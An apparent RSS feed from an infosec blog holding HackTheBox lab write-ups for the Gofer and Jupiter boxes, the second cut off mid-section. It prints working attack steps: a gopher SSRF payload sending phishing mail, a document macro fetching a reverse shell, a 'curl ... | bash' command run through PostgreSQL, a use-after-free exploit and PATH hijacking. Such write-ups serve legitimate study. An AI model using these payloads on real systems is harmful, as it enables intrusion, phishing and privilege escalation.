<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="https://4g3nt47.github.io/rss/feed.xml" rel="self" type="application/atom+xml" /><link href="https://4g3nt47.github.io/" rel="alternate" type="text/html" hreflang="en" /><updated>2023-10-22T06:54:55+01:00</updated><id>https://4g3nt47.github.io/rss/feed.xml</id><title type="html">4g3nt47</title><subtitle>A blog for infosec stuff.</subtitle><entry><title type="html">Gofer - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/gofer.html" rel="alternate" type="text/html" title="Gofer - HackTheBox" /><published>2023-10-22T00:00:00+01:00</published><updated>2023-10-22T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/gofer</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/gofer.html"><![CDATA[<p><strong>Gofer</strong> is a very nice, <em>hard</em> box on <em>HackTheBox</em>. It starts with a verb tampering attack on a custom proxy to bypass access control, then a phishing attack on a local user using <em>LibreOffice</em> macro. Privesc to root is through a use-after-free (UAF) vulnerability on a custom binary.</p>

<p><br /></p>

<h3 id="info">Info</h3>
<p><br /></p>

<p><img src="/assets/img/Pasted image 20230831074150.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230831074223.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>
<p><br /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre></td><td class="rouge-code"><pre># Nmap 7.80 scan initiated Tue Aug 29 10:10:29 2023 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.225
Nmap scan report for 10.10.11.225
Host is up (0.50s latency).
Not shown: 995 closed ports
PORT    STATE    SERVICE     VERSION
22/tcp  open     ssh         OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
25/tcp  filtered smtp
80/tcp  open     http        Apache httpd 2.4.56
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Did not follow redirect to http://gofer.htb/
139/tcp open     netbios-ssn Samba smbd 4.6.2
445/tcp open     netbios-ssn Samba smbd 4.6.2
Service Info: Host: gofer.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| nbstat: NetBIOS name: GOFER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
| Names:
|   GOFER&lt;00&gt;            Flags: &lt;unique&gt;&lt;active&gt;
|   GOFER&lt;03&gt;            Flags: &lt;unique&gt;&lt;active&gt;
|   GOFER&lt;20&gt;            Flags: &lt;unique&gt;&lt;active&gt;
|   \x01\x02__MSBROWSE__\x02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
|_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-08-29T09:11:40
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Aug 29 10:11:54 2023 -- 1 IP address (1 host up) scanned in 84.87 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<p><br /></p>

<h4 id="web">Web</h4>
<p><br />
A site for web developers;</p>

<p><img src="/assets/img/Pasted image 20230831074534.png" alt="" /></p>

<p>Teams section showed potential users;</p>

<p><img src="/assets/img/Pasted image 20230831074942.png" alt="" /></p>

<ul>
  <li>Jeff Davis</li>
  <li>Jocelyn Hudson</li>
  <li>Tom Buckley</li>
  <li>Amanda Blake</li>
</ul>

<p>Subdomain bruteforce got a hit;</p>

<p><img src="/assets/img/Pasted image 20230831075243.png" alt="" /></p>

<p>Going to the domain, I got a login prompt;</p>

<p><img src="/assets/img/Pasted image 20230831075434.png" alt="" />
<img src="/assets/img/Pasted image 20230831075619.png" alt="" /></p>

<p><br /></p>

<h4 id="smb">SMB</h4>
<p><br /></p>

<p>NMAP discovered SMB (Samba) running on the box. Testing it for null authentication with <code class="language-plaintext highlighter-rouge">smbmap</code>, I got a list of shares;</p>

<p><img src="/assets/img/Pasted image 20230831080010.png" alt="" /></p>

<p>We have a read access to the share named <code class="language-plaintext highlighter-rouge">shares</code>. I was able to connect using <code class="language-plaintext highlighter-rouge">smbclient</code>, and download a file;</p>

<p><img src="/assets/img/Pasted image 20230831080239.png" alt="" /></p>

<p>The <code class="language-plaintext highlighter-rouge">mail</code> file contains an email from <code class="language-plaintext highlighter-rouge">jdavis@gofer.htb</code> (Jeff Davis) to <code class="language-plaintext highlighter-rouge">tbuckley@gofer.htb</code> (Tom Buckley);</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre>From jdavis@gofer.htb  Fri Oct 28 20:29:30 2022
Return-Path: &lt;jdavis@gofer.htb&gt;
X-Original-To: tbuckley@gofer.htb
Delivered-To: tbuckley@gofer.htb
Received: from gofer.htb (localhost [127.0.0.1])
        by gofer.htb (Postfix) with SMTP id C8F7461827
        for &lt;tbuckley@gofer.htb&gt;; Fri, 28 Oct 2022 20:28:43 +0100 (BST)
Subject:Important to read!
Message-Id: &lt;20221028192857.C8F7461827@gofer.htb&gt;
Date: Fri, 28 Oct 2022 20:28:43 +0100 (BST)
From: jdavis@gofer.htb

Hello guys,

Our dear Jocelyn received another phishing attempt last week and his habit of clicking on links without paying much attention may be problematic one day. That's why from now on, I've decided that important documents will only be sent internally, by mail, which should greatly limit the risks. If possible, use an .odt format, as documents saved in Office Word are not always well interpreted by Libreoffice.

PS: Last thing for Tom; I know you're working on our web proxy but if you could restrict access, it will be more secure until you have finished it. It seems to me that it should be possible to do so via &lt;Limit&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<p>From the <em>team</em> section of the main page, we already know there is a staff named <em>Jocelyn Hudson</em>. From the email address naming convention, we can assume her username is <code class="language-plaintext highlighter-rouge">jhudson@gofer.htb</code>. The last part of the email also mentions something about the <code class="language-plaintext highlighter-rouge">proxy.gofer.htb</code> domain, and how <em>Tom</em> should use <code class="language-plaintext highlighter-rouge">&lt;Limit&gt;</code> to make it more secure.</p>

<p>From the <a href="https://httpd.apache.org/docs/2.4/mod/core.html#limit"><em>Apache2</em> docs</a>, <code class="language-plaintext highlighter-rouge">&lt;Limit&gt;</code> is basically used to restrict the HTTP methods allowed for a given route in a <strong>blacklist</strong> approach;</p>

<p><img src="/assets/img/Pasted image 20230831081312.png" alt="" /></p>

<p>This hints at a possible <em>HTTP verb tampering</em> attack. I started playing around with the request, and got a different response when sending a POST request to <code class="language-plaintext highlighter-rouge">/index.php</code>;</p>

<p><img src="/assets/img/Pasted image 20230831081610.png" alt="" /></p>

<p>Setting a <code class="language-plaintext highlighter-rouge">URL</code> and <code class="language-plaintext highlighter-rouge">url</code> parameter in the request body gave the same error. Setting <code class="language-plaintext highlighter-rouge">url</code> as query/GET parameter after<code class="language-plaintext highlighter-rouge">index.php</code> worked;</p>

<p><img src="/assets/img/Pasted image 20230831081954.png" alt="" />
<img src="/assets/img/Pasted image 20230831082013.png" alt="" /></p>

<p>Looks like we have a <em>Server Side Request Forgery (SSRF)</em>. Attempting to send request to localhost showed itâ€™s blocked;</p>

<p><img src="/assets/img/Pasted image 20230831082223.png" alt="" /></p>

<p>Using a HTTP redirector seems to work, but so does the IP address <code class="language-plaintext highlighter-rouge">0.0.0.0</code>;</p>

<p><img src="/assets/img/Pasted image 20230831082404.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="foothold">Foothold</h3>
<p><br /></p>

<p>NMAP earlier showed port <strong>25</strong> (SMTP) is filtered. This is interesting because if the proxy supports the <em>gopher</em> protocol, we could use it to interact with the SMTP server as unlike HTTP, gopher does not send any extra data. Testing this, it seems the protocol is supported;</p>

<p><img src="/assets/img/Pasted image 20230831083012.png" alt="" />
<img src="/assets/img/Pasted image 20230831083032.png" alt="" /></p>

<p>From the leaked email, we were told <em>Jocelyn</em> has a habit of clicking all links sent to her, and that all internal document should be sent in <code class="language-plaintext highlighter-rouge">.odt</code> format, which is the format <em>LIbreOffice</em> uses by default. Using <a href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery#ssrf-redirect-to-gopher">this cheatsheet</a>, I crafted a gopher SSRF payload that will send an email to <code class="language-plaintext highlighter-rouge">jhudson@gofer.htb</code> (our dear Jocelyn) from <code class="language-plaintext highlighter-rouge">jdavis@gofer.htb</code> with a link to <code class="language-plaintext highlighter-rouge">http://10.10.16.73/clicked</code>;</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>url=gopher://0.0.0.0:25/xMAIL%20FROM%3Ajdavis%40gofer.htb%250d%250aRCPT%20TO%3Ajhudson%40gofer.htb%250d%250aDATA%250d%250aFrom%3A%20jdavis%40gofer.htb%250d%250aTo%3A%20jhudson%40gofer.htb%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250a%20http%3A%2F%2F10.10.16.73%2Fclicked%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
</pre></td></tr></tbody></table></code></pre></div></div>
<p><img src="/assets/img/Pasted image 20230831084022.png" alt="" /></p>

<p>She clicked :)</p>

<p><img src="/assets/img/Pasted image 20230831084055.png" alt="" /></p>

<p>So I opened up <em>LibreOffice</em> and create a <em>writer</em> document named <code class="language-plaintext highlighter-rouge">payload.odt</code>;</p>

<p><img src="/assets/img/Pasted image 20230831084726.png" alt="" /></p>

<p>I then go to <code class="language-plaintext highlighter-rouge">Tools &gt;&gt; Macros &gt;&gt; Organize Macros &gt;&gt; Basic</code> to create a macro;</p>

<p><img src="/assets/img/Pasted image 20230831085048.png" alt="" /></p>

<p>I named it <code class="language-plaintext highlighter-rouge">payload</code>, and added the following code that will download and execute a reverse shell from my box;</p>

<p><img src="/assets/img/Pasted image 20230831085221.png" alt="" /></p>

<p>Now we need to register an event that will execute the macro the moment the document is opened. To do that we go to <code class="language-plaintext highlighter-rouge">Tools &gt;&gt; Macros &gt;&gt; Organize Macros &gt;&gt; Basic</code>, select our macro, and click the <code class="language-plaintext highlighter-rouge">Assign</code> button;</p>

<p><img src="/assets/img/Pasted image 20230831085519.png" alt="" /></p>

<p>From the lists of events, click on the <code class="language-plaintext highlighter-rouge">Open Document</code> event, then click the <code class="language-plaintext highlighter-rouge">Macro</code> button and select your macro;</p>

<p><img src="/assets/img/Pasted image 20230831085713.png" alt="" /></p>

<p>If all went well, you should see something like this;</p>

<p><img src="/assets/img/Pasted image 20230831085806.png" alt="" /></p>

<p>I then saved the document, host it on a HTTP server on my box, start a listener, and sent a link to it to <code class="language-plaintext highlighter-rouge">jhudson@gofer.htb</code>;</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>gopher://0.0.0.0:25/xMAIL%20FROM%3Ajdavis%40gofer.htb%250d%250aRCPT%20TO%3Ajhudson%40gofer.htb%250d%250aDATA%250d%250aFrom%3A%20jdavis%40gofer.htb%250d%250aTo%3A%20jhudson%40gofer.htb%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250a%20http%3A%2F%2F10.10.16.73%2Fpayload.odt%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
</pre></td></tr></tbody></table></code></pre></div></div>

<p>It worked, and I got a shell (I had to send the request twice for some reasons);</p>

<p><img src="/assets/img/Pasted image 20230831090455.png" alt="" /></p>

<p>Got the <code class="language-plaintext highlighter-rouge">user.txt</code> in her home dir;</p>

<p><img src="/assets/img/Pasted image 20230831090733.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p>Canâ€™t check <code class="language-plaintext highlighter-rouge">sudo</code> perms because <code class="language-plaintext highlighter-rouge">sudo</code> is not even installed on the box. She is a member of group <code class="language-plaintext highlighter-rouge">netdev</code> though, but I couldnâ€™t find any interesting files linked to that group;</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>jhudson@gofer:~$ sudo -l
bash: sudo: command not found
You have mail in /var/mail/jhudson
jhudson@gofer:~$ groups
jhudson netdev
jhudson@gofer:~$
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Local filesystem enum found a hash for one of the local users <code class="language-plaintext highlighter-rouge">tbuckley</code>;</p>

<p><img src="/assets/img/Pasted image 20230831091145.png" alt="" /></p>

<p>Started cracking it with <code class="language-plaintext highlighter-rouge">john</code>, but it was taking too long, so I moved on. Running <code class="language-plaintext highlighter-rouge">pspy</code> on the box picked up a plaintext cred for the same user;</p>

<p><img src="/assets/img/Pasted image 20230831094008.png" alt="" /></p>

<p>Using the password <code class="language-plaintext highlighter-rouge">ooP4dietie3o_hquaeti</code>, I was able to login as <code class="language-plaintext highlighter-rouge">tbuckley</code>;</p>

<p><img src="/assets/img/Pasted image 20230831094129.png" alt="" /></p>

<p><code class="language-plaintext highlighter-rouge">tbuckley</code> is in the <code class="language-plaintext highlighter-rouge">dev</code> group. Searching for files linked to this group found a single match, which is a SUID executable;</p>

<p><img src="/assets/img/Pasted image 20230831094403.png" alt="" />
<img src="/assets/img/Pasted image 20230831094517.png" alt="" /></p>

<p>So I downloaded it to my box and load it up in IDA for some analysis;</p>

<p>=&gt; Option 1 for creating user;</p>

<p><img src="/assets/img/Pasted image 20230831100054.png" alt="" /></p>

<p>=&gt; The delete user feature <strong>does not</strong> overwrite the buffer pointer after freeing it, making it vulnerable to <em>use-after-free (UAF)</em> vulnerability;</p>

<p><img src="/assets/img/Pasted image 20230831100510.png" alt="" /></p>

<p>=&gt; Option 4 used for writing note;</p>

<p><img src="/assets/img/Pasted image 20230831100741.png" alt="" /></p>

<p>=&gt; Option 8 used for backing up notes;</p>

<p><img src="/assets/img/Pasted image 20230831101906.png" alt="" /></p>

<p>Notice that the buffer allocated when writing notes is the exact same size of the buffer used to store userâ€™s username and role. Chaining this with the <em>UAF</em> in the delete user implementation, we could easily exploit this and trick the note writing feature into using the user data buffer by;</p>
<ol>
  <li>Creating a user, which allocates a 40 byte buffer.</li>
  <li>Deleting user, which frees the user buffer, but keep itâ€™s reference.</li>
  <li>Creating a note, which will request 40 bytes from the heap, and will be reassigned the previously freed 40 bytes buffer thatâ€™s still being referenced by user buffer pointer.</li>
  <li>Writing an arbitrary role value after 24 bytes padding.</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
</pre></td><td class="rouge-code"><pre>tbuckley@gofer:/$ notes
========================================
1) Create an user and choose an username
2) Show user information
3) Delete an user
4) Write a note
5) Show a note
6) Save a note (not yet implemented)
7) Delete a note
8) Backup notes
9) Quit
========================================


Your choice: 1

Choose an username: agent47

========================================
1) Create an user and choose an username
2) Show user information
3) Delete an user
4) Write a note
5) Show a note
6) Save a note (not yet implemented)
7) Delete a note
8) Backup notes
9) Quit
========================================


Your choice: 2


Username: agent47
Role: user

========================================
1) Create an user and choose an username
2) Show user information
3) Delete an user
4) Write a note
5) Show a note
6) Save a note (not yet implemented)
7) Delete a note
8) Backup notes
9) Quit
========================================


Your choice: 3

========================================
1) Create an user and choose an username
2) Show user information
3) Delete an user
4) Write a note
5) Show a note
6) Save a note (not yet implemented)
7) Delete a note
8) Backup notes
9) Quit
========================================


Your choice: 4

Write your note:
AAAAAAAAAAAAAAAAAAAAAAAAadmin
========================================
1) Create an user and choose an username
2) Show user information
3) Delete an user
4) Write a note
5) Show a note
6) Save a note (not yet implemented)
7) Delete a note
8) Backup notes
9) Quit
========================================


Your choice: 2


Username: AAAAAAAAAAAAAAAAAAAAAAAAadmin
Role: admin

========================================
1) Create an user and choose an username
2) Show user information
3) Delete an user
4) Write a note
5) Show a note
6) Save a note (not yet implemented)
7) Delete a note
8) Backup notes
9) Quit
========================================


Your choice:
</pre></td></tr></tbody></table></code></pre></div></div>

<p>As you can see above, we were able to overwrite the role parameter and set it to <code class="language-plaintext highlighter-rouge">admin</code>, which should now give us access to the vulnerable notes backup feature. I created a script named <code class="language-plaintext highlighter-rouge">tar</code> in <code class="language-plaintext highlighter-rouge">/dev/shm</code> with the payload;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>
bash <span class="nt">-p</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>I then made it executable and added it to my <code class="language-plaintext highlighter-rouge">$PATH</code> variable. I then exploited the <em>UAF</em> and called option 8, which gave me a shell on the box as <code class="language-plaintext highlighter-rouge">root</code>;</p>

<p><img src="/assets/img/Pasted image 20230831102504.png" alt="" />
<img src="/assets/img/Pasted image 20230831102534.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>NMAP found port <strong>22</strong>, <strong>25</strong> (filtered), <strong>80</strong>, and <strong>445</strong></li>
  <li>Found an email in an open samba share</li>
  <li><code class="language-plaintext highlighter-rouge">poxy.gofer.htb</code> uses <code class="language-plaintext highlighter-rouge">&lt;Limit&gt;</code> for access control, and is vulnerable to HTTP verb tampering.
    <ul>
      <li>Exploited an SSRF send link to malicious <code class="language-plaintext highlighter-rouge">.odt</code> file to <code class="language-plaintext highlighter-rouge">jhudson@gofer,htb</code>, which gave me a shell on the box.</li>
    </ul>
  </li>
  <li>Inside the box as <code class="language-plaintext highlighter-rouge">jhudson</code>;
    <ul>
      <li><code class="language-plaintext highlighter-rouge">pspy</code> caught a plain creds for user <code class="language-plaintext highlighter-rouge">tbuckley</code> passed in a <code class="language-plaintext highlighter-rouge">curl</code> command.</li>
    </ul>
  </li>
  <li>Inside the box as <code class="language-plaintext highlighter-rouge">tbuckley</code>;
    <ul>
      <li>Exploited a <em>use-after-free (UAF)</em> vulnerability and <em>PATH hijacking</em> to gain code execution as <code class="language-plaintext highlighter-rouge">root</code>.</li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="hard" /><category term="linux" /><category term="web" /><category term="verb tampering" /><category term="smb" /><category term="ssrf" /><category term="smtp" /><category term="libreoffice" /><category term="macro" /><category term="phishing" /><category term="htpasswd" /><category term="htaccess" /><category term="UAF" /><category term="binary exploitation" /><summary type="html"><![CDATA[Gofer is a very nice, hard box on HackTheBox. It starts with a verb tampering attack on a custom proxy to bypass access control, then a phishing attack on a local user using LibreOffice macro. Privesc to root is through a use-after-free (UAF) vulnerability on a custom binary.]]></summary></entry><entry><title type="html">Jupiter - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/jupiter.html" rel="alternate" type="text/html" title="Jupiter - HackTheBox" /><published>2023-10-22T00:00:00+01:00</published><updated>2023-10-22T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/jupiter</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/jupiter.html"><![CDATA[<p><strong>Jupiter</strong> is a very nice medium linux box on <em>HackTheBox</em>. It starts with exploiting an instance of <em>Grafana</em> thatâ€™s making an API call containing full SQL queries, which are executed without validation. Youâ€™ll then exploit a <em>shadow simulator</em> cron job to gain access to a local user. This will give you access to some log files containing access token for a local <em>Jupyter Notebook</em> instance. Privesc involves exploiting <em>Arftracksat</em>, a satellite tracker.</p>

<p><br /></p>

<h3 id="jupiter">Jupiter</h3>
<p><br /></p>

<p><img src="/assets/img/Pasted image 20230902085407.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230902085426.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>
<p><br /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre># Nmap 7.80 scan initiated Thu Aug 24 09:04:09 2023 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.216
Nmap scan report for 10.10.11.216
Host is up (0.51s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://jupiter.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 24 09:05:24 2023 -- 1 IP address (1 host up) scanned in 75.15 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<p><br /></p>

<h4 id="web">Web</h4>
<p><br /></p>

<p>Redirects to <code class="language-plaintext highlighter-rouge">jupiter.htb</code>;</p>

<p><img src="/assets/img/Pasted image 20230902085630.png" alt="" /></p>

<p>Subdomain bruteforce with <code class="language-plaintext highlighter-rouge">ffuf</code> revealed the subdomain <code class="language-plaintext highlighter-rouge">kiosk.jupiter.htb</code>;</p>

<p><img src="/assets/img/Pasted image 20230902085832.png" alt="" /></p>

<p>This seems to be running <em>Grafana</em>. Going through the site and checking my proxy logs showed an interesting request to the endpoint <code class="language-plaintext highlighter-rouge">/api/ds/query</code>;</p>

<p><img src="/assets/img/Pasted image 20230902090209.png" alt="" /></p>

<p>That <code class="language-plaintext highlighter-rouge">rawSql</code> parameter looks very interesting as it seems to contain a complete SQL query that the server ran. Replacing it with <code class="language-plaintext highlighter-rouge">show version()</code>, I got the database version in response;</p>

<p><img src="/assets/img/Pasted image 20230902090437.png" alt="" /></p>

<p>Our target is running <em>PostgreSQL</em>.</p>

<hr />

<p><br /></p>

<h3 id="foothold">Foothold</h3>
<p><br /></p>

<p>Running <code class="language-plaintext highlighter-rouge">select current_user</code> showed we are running queries as <code class="language-plaintext highlighter-rouge">grafana_viewer</code>. Testing if the server allows us to run shell commands by;</p>
<ol>
  <li>Creating a table <code class="language-plaintext highlighter-rouge">cmd_exec</code> with column <code class="language-plaintext highlighter-rouge">cmd_output</code> for output exfil;
    <ul>
      <li><code class="language-plaintext highlighter-rouge">create table cmd_exec(cmd_output varchar(999999)))</code></li>
    </ul>
  </li>
  <li>Fetching and executing <code class="language-plaintext highlighter-rouge">shell.sh</code> from my box, which contains a bash rev shell;
    <ul>
      <li><code class="language-plaintext highlighter-rouge">COPY cmd_exec FROM PROGRAM 'curl http://10.10.16.73/shell.sh | bash'</code></li>
    </ul>
  </li>
</ol>

<p><img src="/assets/img/Pasted image 20230902091804.png" alt="" /></p>

<hr />

<p><br /></p>

<h3 id="user">User</h3>
<p><br /></p>

<p>So we now have a shell on the box as <code class="language-plaintext highlighter-rouge">postgres</code>, which is the default <em>PostgreSQL</em> user. Going through the filesystem, some interesting files were found in <code class="language-plaintext highlighter-rouge">/dev/shm</code>;</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>postgres@jupiter:/dev/shm<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
total 32
<span class="nt">-rw-rw-rw-</span> 1 juno     juno       815 Mar  7 12:28 network-simulation.yml
<span class="nt">-rw-------</span> 1 postgres postgres 26976 Sep  2 08:15 PostgreSQL.3984354716
drwxrwxr-x 3 juno     juno       100 Sep  2 08:18 shadow.data
postgres@jupiter:/dev/shm<span class="nv">$ </span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Running <code class="language-plaintext highlighter-rouge">pspy</code> showed these files are processed by a cron job running as user <code class="language-plaintext highlighter-rouge">juno</code>;</p>

<p><img src="/assets/img/Pasted image 20230902092320.png" alt="" /></p>

<p>The file <code class="language-plaintext highlighter-rouge">network-simulation.yml</code> seems to be the configuration file of <a href="https://shadow.github.io/docs/guide/getting_started_basic.html">Shadow Simulator</a>;</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre></td><td class="rouge-code"><pre><span class="na">general</span><span class="pi">:</span>
  <span class="c1"># stop after 10 simulated seconds</span>
  <span class="na">stop_time</span><span class="pi">:</span> <span class="s">10s</span>
  <span class="c1"># old versions of cURL use a busy loop, so to avoid spinning in this busy</span>
  <span class="c1"># loop indefinitely, we add a system call latency to advance the simulated</span>
  <span class="c1"># time when running non-blocking system calls</span>
  <span class="na">model_unblocked_syscall_latency</span><span class="pi">:</span> <span class="no">true</span>

<span class="na">network</span><span class="pi">:</span>
  <span class="na">graph</span><span class="pi">:</span>
    <span class="c1"># use a built-in network graph containing</span>
    <span class="c1"># a single vertex with a bandwidth of 1 Gbit</span>
    <span class="na">type</span><span class="pi">:</span> <span class="s">1_gbit_switch</span>

<span class="na">hosts</span><span class="pi">:</span>
  <span class="c1"># a host with the hostname 'server'</span>
  <span class="na">server</span><span class="pi">:</span>
    <span class="na">network_node_id</span><span class="pi">:</span> <span class="m">0</span>
    <span class="na">processes</span><span class="pi">:</span>
    <span class="pi">-</span> <span class="na">path</span><span class="pi">:</span> <span class="s">/usr/bin/python3</span>
      <span class="na">args</span><span class="pi">:</span> <span class="s">-m http.server </span><span class="m">80</span>
      <span class="na">start_time</span><span class="pi">:</span> <span class="s">3s</span>
  <span class="c1"># three hosts with hostnames 'client1', 'client2', and 'client3'</span>
  <span class="na">client</span><span class="pi">:</span>
    <span class="na">network_node_id</span><span class="pi">:</span> <span class="m">0</span>
    <span class="na">quantity</span><span class="pi">:</span> <span class="m">3</span>
    <span class="na">processes</span><span class="pi">:</span>
    <span class="pi">-</span> <span class="na">path</span><span class="pi">:</span> <span class="s">/usr/bin/curl</span>
      <span class="na">args</span><span class="pi">:</span> <span class="s">-s server</span>
      <span class="na">start_time</span><span class="pi">:</span> <span class="s">5s</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This obviously contains shell commands, and we can write to it. My initial attempt to modify it with a reverse shell kept failing. So I just added a payload that copies <code class="language-plaintext highlighter-rouge">/bin/sh</code> to <code class="language-plaintext highlighter-rouge">/tmp</code> and make it SUID as <code class="language-plaintext highlighter-rouge">juno</code>, and it worked (I had to copy the file separately and then chmod it as the program somehow doesnâ€™t like command chaining);</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>  client:
    network_node_id: 0
    quantity: 3
    processes:
    - path: /bin/cp
      args: /bin/sh /tmp/sh
      start_time: 5s
</pre></td></tr></tbody></table></code></pre></div></div>

<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>  <span class="na">client</span><span class="pi">:</span>
    <span class="na">network_node_id</span><span class="pi">:</span> <span class="m">0</span>
    <span class="na">quantity</span><span class="pi">:</span> <span class="m">3</span>
    <span class="na">processes</span><span class="pi">:</span>
    <span class="pi">-</span> <span class="na">path</span><span class="pi">:</span> <span class="s">/bin/sh</span>
      <span class="na">args</span><span class="pi">:</span> <span class="s">4755 /tmp/sh</span>
      <span class="na">start_time</span><span class="pi">:</span> <span class="s">5s</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Note that I was still getting a permission denied error when attempting to read his files, akthough <code class="language-plaintext highlighter-rouge">id</code> showed my effective ID has been changed to <code class="language-plaintext highlighter-rouge">juno</code>;</p>

